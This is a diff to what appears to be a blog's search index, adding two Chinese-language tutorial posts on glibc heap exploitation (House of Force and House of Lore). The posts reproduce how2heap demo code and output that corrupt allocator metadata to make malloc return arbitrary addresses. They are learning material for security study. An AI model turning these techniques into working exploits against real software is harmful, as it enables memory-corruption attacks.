@@ -3,6 +3,52 @@
   
     
     <entry>
+      <title>Introduction to pwn2.7-HouseOfForce</title>
+      <link href="/2019/01/22/introduction-to-pwn2-7-houseofforce/"/>
+      <url>/2019/01/22/introduction-to-pwn2-7-houseofforce/</url>
+      <content type="html"><![CDATA[<h1 id="House-of-Force-原理"><a href="#House-of-Force-原理" class="headerlink" title="House of Force 原理"></a>House of Force 原理</h1><p>一个比较有意思的利用，也是第一次对top chunk 下手，原因在于堆管理中并没有多的检查top chunk的大小问题。</p><p>我们在有机会溢出改变top chunk size的情况下，可以将其改大（eg:-1，64位下即为0xffffffffffffffff），之后不论申请多大的chunk，经比较size之后，都不会去调用mmap去分配top chunk，但我们可以通过分配足够大小的chunk使之在main_arena中top chunk的指针变换位置，也就是说，我们可以将其分配之后的chunk到我们想要的地址（eg:got表），这样我们便可以通过控制我们可以控制的指针来任意地址写。</p><p>使用how2heap的例子来解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc , char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;\nWelcome to the House of Force\n\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot;</span><br><span class="line">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;, bss_var);</span><br><span class="line">fprintf(stderr, &quot;Its current value is: %s\n&quot;, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nLet&apos;s allocate the first chunk, taking space from the wilderness.\n&quot;);</span><br><span class="line">intptr_t *p1 = malloc(256);</span><br><span class="line">fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\n&quot;, p1 - sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;);</span><br><span class="line">int real_size = malloc_usable_size(p1);</span><br><span class="line">fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;, real_size + sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nNow let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;);</span><br><span class="line"></span><br><span class="line">//----- VULNERABILITY ----</span><br><span class="line">intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));</span><br><span class="line">fprintf(stderr, &quot;\nThe top chunk starts at %p\n&quot;, ptr_top);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;Old size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));</span><br><span class="line">*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;</span><br><span class="line">fprintf(stderr, &quot;New size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));</span><br><span class="line">//------------------------</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span><br><span class="line">   &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span><br><span class="line">   &quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;);</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span><br><span class="line"> * new_top = old_top + nb</span><br><span class="line"> * nb = new_top - old_top</span><br><span class="line"> * req + 2sizeof(long) = new_top - old_top</span><br><span class="line"> * req = new_top - old_top - 2sizeof(long)</span><br><span class="line"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span><br><span class="line"> * req = dest - old_top - 4*sizeof(long)</span><br><span class="line"> */</span><br><span class="line">unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;</span><br><span class="line">fprintf(stderr, &quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span><br><span class="line">   &quot;we will malloc %#lx bytes.\n&quot;, bss_var, ptr_top, evil_size);</span><br><span class="line">void *new_ptr = malloc(evil_size);</span><br><span class="line">fprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;, new_ptr - sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">void* ctr_chunk = malloc(100);</span><br><span class="line">fprintf(stderr, &quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;malloc(100) =&gt; %p!\n&quot;, ctr_chunk);</span><br><span class="line">fprintf(stderr, &quot;Now, we can finally overwrite that value:\n&quot;);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;... old string: %s\n&quot;, bss_var);</span><br><span class="line">fprintf(stderr, &quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;);</span><br><span class="line">strcpy(ctr_chunk, &quot;YEAH!!!&quot;);</span><br><span class="line">fprintf(stderr, &quot;... new string: %s\n&quot;, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// some further discussion:</span><br><span class="line">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span><br><span class="line">//&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span><br><span class="line">//&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span><br><span class="line"></span><br><span class="line">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span><br><span class="line">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span><br><span class="line"></span><br><span class="line">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the House of Force</span><br><span class="line"></span><br><span class="line">The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.</span><br><span class="line">The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.</span><br><span class="line"></span><br><span class="line">In the end, we will use this to overwrite a variable at 0x602060.</span><br><span class="line">Its current value is: This is a string that we want to overwrite.</span><br><span class="line"></span><br><span class="line">Let&apos;s allocate the first chunk, taking space from the wilderness.</span><br><span class="line">The chunk of 256 bytes has been allocated at 0xd61f90.</span><br><span class="line"></span><br><span class="line">Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.</span><br><span class="line">Real size (aligned and all that jazz) of our allocated chunk is 280.</span><br><span class="line"></span><br><span class="line">Now let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk</span><br><span class="line"></span><br><span class="line">The top chunk starts at 0xd62110</span><br><span class="line"></span><br><span class="line">Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.</span><br><span class="line">Old size of top chunk 0x20ef1</span><br><span class="line">New size of top chunk 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.</span><br><span class="line">Next, we will allocate a chunk that will get us right up against the desired region (with an integer</span><br><span class="line">overflow) and will then be able to allocate a chunk right over the desired region.</span><br><span class="line"></span><br><span class="line">The value we want to write to at 0x602060, and the top chunk is at 0xd62110, so accounting for the header size,</span><br><span class="line">we will malloc 0xffffffffff89ff30 bytes.</span><br><span class="line">As expected, the new pointer is at the same place as the old top chunk: 0xd62110</span><br><span class="line"></span><br><span class="line">Now, the next chunk we overwrite will point at our target buffer.</span><br><span class="line">malloc(100) =&gt; 0x602060!</span><br><span class="line">Now, we can finally overwrite that value:</span><br><span class="line">... old string: This is a string that we want to overwrite.</span><br><span class="line">... doing strcpy overwrite with &quot;YEAH!!!&quot;...</span><br><span class="line">... new string: YEAH!!!</span><br></pre></td></tr></table></figure><p>原理可以参考：<a href="https://bbs.pediy.com/thread-222924.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222924.htm</a></p>]]></content>
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> heap </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>Introduction to pwn2.6-HouseOfLore</title>
+      <link href="/2019/01/22/introduction-to-pwn2-6-houseoflore/"/>
+      <url>/2019/01/22/introduction-to-pwn2-6-houseoflore/</url>
+      <content type="html"><![CDATA[<h1 id="House-of-Lore-原理"><a href="#House-of-Lore-原理" class="headerlink" title="House of Lore 原理"></a>House of Lore 原理</h1><p>看了下原理，没有太多的东西，和house of spirit的思想是一样的，只是spirit是在fastbin大小的chunk范围内伪造fake chunk，而House of Lore是small bin 与 large bin大小的chunk ， 不过后来因为large bin添加了保护措施，便无法再利用。</p><p>house of lore 相比会麻烦一点，毕竟smallbin的检查比较多，因而大部分准备都是为了能够绕过检测。</p><p>单拿例子说一下吧，有对应的练习之后再加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">struct small_chunk &#123;</span><br><span class="line">  size_t prev_size;</span><br><span class="line">  size_t size;</span><br><span class="line">  struct small_chunk *fd;</span><br><span class="line">  struct small_chunk *bk;</span><br><span class="line">  char buf[0x64];               // chunk falls in smallbin size range</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct small_chunk fake_chunk;                  // At address 0x7ffdeb37d050</span><br><span class="line">struct small_chunk another_fake_chunk;</span><br><span class="line">struct small_chunk *real_chunk;</span><br><span class="line">unsigned long long *ptr, *victim;</span><br><span class="line">int len;</span><br><span class="line"></span><br><span class="line">len = sizeof(struct small_chunk);</span><br><span class="line"></span><br><span class="line">// Grab two small chunk and free the first one</span><br><span class="line">// This chunk will go into unsorted bin</span><br><span class="line">ptr = malloc(len);                              // points to address 0x1a44010</span><br><span class="line"></span><br><span class="line">// The second malloc can be of random size. We just want that</span><br><span class="line">// the first chunk does not merge with the top chunk on freeing</span><br><span class="line">malloc(len);                                    // points to address 0x1a440a0</span><br><span class="line"></span><br><span class="line">// This chunk will end up in unsorted bin</span><br><span class="line">free(ptr);</span><br><span class="line"></span><br><span class="line">real_chunk = (struct small_chunk *)(ptr - 2);   // points to address 0x1a44000</span><br><span class="line"></span><br><span class="line">// Grab another chunk with greater size so as to prevent getting back</span><br><span class="line">// the same one. Also, the previous chunk will now go from unsorted to</span><br><span class="line">// small bin</span><br><span class="line">malloc(len + 0x10);                             // points to address 0x1a44130</span><br><span class="line"></span><br><span class="line">// Make the real small chunk&apos;s bk pointer point to &amp;fake_chunk</span><br><span class="line">// This will insert the fake chunk in the smallbin</span><br><span class="line">real_chunk-&gt;bk = &amp;fake_chunk;</span><br><span class="line">// and fake_chunk&apos;s fd point to the small chunk</span><br><span class="line">// This will ensure that &apos;victim-&gt;bk-&gt;fd == victim&apos; for the real chunk</span><br><span class="line">fake_chunk.fd = real_chunk;</span><br><span class="line"></span><br><span class="line">// We also need this &apos;victim-&gt;bk-&gt;fd == victim&apos; test to pass for fake chunk</span><br><span class="line">fake_chunk.bk = &amp;another_fake_chunk;</span><br><span class="line">another_fake_chunk.fd = &amp;fake_chunk;</span><br><span class="line"></span><br><span class="line">// Remove the real chunk by a standard call to malloc</span><br><span class="line">malloc(len);                                    // points at address 0x1a44010</span><br><span class="line"></span><br><span class="line">// Next malloc for that size will return the fake chunk</span><br><span class="line">victim = malloc(len);                           // points at address 0x7ffdeb37d060</span><br></pre></td></tr></table></figure><p>注释已经说得很清楚了，就不再赘述了</p>]]></content>
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> heap </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>网鼎杯pwn复现</title>
       <link href="/2018/12/28/%E7%BD%91%E9%BC%8E%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/"/>
       <url>/2018/12/28/%E7%BD%91%E9%BC%8E%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/</url>
@@ -17,9 +63,9 @@
       
         <tags>
             
-            <tag> heap </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> heap </tag>
             
             <tag> stack </tag>
             
@@ -42,9 +88,9 @@
       
         <tags>
             
-            <tag> heap </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> heap </tag>
             
         </tags>
       
@@ -65,9 +111,9 @@
       
         <tags>
             
-            <tag> heap </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> heap </tag>
             
         </tags>
       
@@ -111,9 +157,9 @@
       
         <tags>
             
-            <tag> heap </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> heap </tag>
             
             <tag> stack </tag>
             
@@ -178,9 +224,9 @@
       
         <tags>
             
-            <tag> heap </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> heap </tag>
             
         </tags>
       
@@ -201,9 +247,9 @@
       
         <tags>
             
-            <tag> heap </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> heap </tag>
             
         </tags>
       
@@ -268,9 +314,9 @@
       
         <tags>
             
-            <tag> heap </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> heap </tag>
             
             <tag> stack </tag>
             
@@ -339,9 +385,9 @@
       
         <tags>
             
-            <tag> heap </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> heap </tag>
             
         </tags>
       
